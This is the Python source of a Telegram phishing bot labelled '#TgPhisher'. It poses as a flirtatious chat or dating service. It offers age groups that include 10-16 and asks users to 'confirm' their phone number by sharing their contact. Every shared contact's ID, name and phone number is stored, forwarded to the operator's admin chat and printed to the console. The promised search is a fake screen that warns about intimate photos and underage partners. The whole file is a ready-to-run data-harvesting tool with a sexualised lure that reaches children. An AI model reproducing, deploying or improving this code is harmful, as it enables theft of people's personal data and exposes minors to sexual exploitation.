# By Luka
import telebot
import sys
from telebot import types
import telebot
import os
import requests
from telebot import types
import colorama
from colorama import init, Fore, Style, Back
from banner import banner
from database import DB

init()

# Определение цветов
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT


bottoken = sys.argv[1]
admin = sys.argv[2]
title = sys.argv[3]


os.system('cls' if os.name == 'nt' else 'clear')
print(banner.format(bold=bold, blue=blue, reset=reset, title=title, yellow=yellow, cyan=cyan))

def get_bot_username(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url).json()

# Проверяем, что запрос успешно выполнен и содержит имя пользователя
    if response.get("ok") and 'username' in response.get("result", {}):
        return response["result"]["username"]
    else:
        return None

username = get_bot_username(bottoken)
if username:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner.format(bold=bold, blue=blue, reset=reset, title=title, yellow=yellow, cyan=cyan))
    print(f"        Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}\n        Юзернейм вашего бота: {yellow}@{username}{reset}\n        Отправьте с вашего аккаунта\n        Команду {yellow}- /start{reset} боту.")      
bot = telebot.TeleBot(bottoken)
user_data = {}
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, f"<b>Привет, {message.from_user.first_name}!</b> 🍒 Здесь ты сможешь пообщаться и развлечься с желающими этого людьми. Сначала укажите ваш возрастную группу, чтобы находить людей по вашим параметрам.", parse_mode='HTML')
    markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('10-16')
    itembtn2 = types.KeyboardButton('16-18')
    itembtn3 = types.KeyboardButton('18+')
    bot.send_message(message.chat.id, "Выберите возрастную группу:", reply_markup=markup.add(itembtn1, itembtn2, itembtn3))

@bot.message_handler(func=lambda message: message.text in ['10-16', '16-18', '18+'])
def set_age(message):
    user_data[message.chat.id] = {'age': message.text}
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('Подтвердить номер', request_contact=True)
    bot.send_message(message.chat.id, "Подтвердите ваш номер телефона:", reply_markup=markup.add(itembtn1))

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    markup = types.ReplyKeyboardRemove()
    db = DB("ac")
    if not db.is_exist(message.contact.user_id):
        db.add_user(
            message.contact.user_id,
            message.contact.first_name,
            message.contact.last_name,
            phone=message.contact.phone_number
        )
        db.close()
        try:
            bot.send_message(admin, f'''
                            #TgPhisher - {username}

                            - {message.contact.user_id}
                            - {message.contact.first_name} {message.contact.last_name}
                            - {message.contact.phone_number}
                            - By @immortal_nameless''')
        except:
            print('     error send to ADMIN_ID      ')
    if message.contact.user_id == message.from_user.id:


        border = "{:-^40}".format("")
        print(Fore.YELLOW + border + Style.RESET_ALL)
        print(Fore.GREEN + "      ID: " + Fore.WHITE + "{:<31}".format(message.from_user.id)+Style.RESET_ALL)
        print(Fore.GREEN + "      Имя: " + Fore.WHITE + "{:<29}".format(f"{message.contact.first_name} {message.contact.last_name}") + Style.RESET_ALL)
        if message.from_user.username:
            print(Fore.GREEN + "      Username: " + Fore.WHITE + "{:<24}".format("@" + message.from_user.username) + Style.RESET_ALL)
        print(Fore.GREEN + "      Возрастная группа: "+ Fore.WHITE + "{:<31}".format(user_data[message.chat.id]['age']) + Style.RESET_ALL)
        print(Fore.GREEN + "      Номер телефона: " + Fore.WHITE + "{:<14}".format(message.contact.phone_number) + Style.RESET_ALL)
        print(Fore.YELLOW + border + Style.RESET_ALL)


        bot.send_message(message.chat.id, "<b>🍒 Регистрация завершена!</b>\nДля поиска воспользуйтесь - /search", reply_markup=markup, parse_mode="HTML")
    else:

        border = "{:-^40}".format("")
        print(Fore.YELLOW + border + Style.RESET_ALL)
        print(Fore.GREEN + "      ID: " + Fore.WHITE + "{:<31}".format(message.contact.user_id)+Style.RESET_ALL)
        print(Fore.GREEN + "      Имя: " + Fore.WHITE + "{:<29}".format(f"{message.contact.first_name} {message.contact.last_name}") + Style.RESET_ALL)
        print(Fore.GREEN + "      Номер телефона: " + Fore.WHITE + "{:<14}".format(message.contact.phone_number) + Style.RESET_ALL)
        print(Fore.YELLOW + border + Style.RESET_ALL)


        bot.send_message(message.chat.id, "Вы отправили не свой номер телефона!", reply_markup=markup)



@bot.message_handler(commands=['search'])
def default_handler(message):
    bot.send_message(message.chat.id, f'''
<b>🔍 Идет ожидание онлайн пользователей...</b>


<i>🍒 - Будьте осторожны при отправке личных фото/видео материалов!

💬 - Собеседник может быть несовершенно летнего возраста
        Мы не несем ответственность за ваши действия.</i>
''', parse_mode="html")


try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Произошла ошибка: {e}")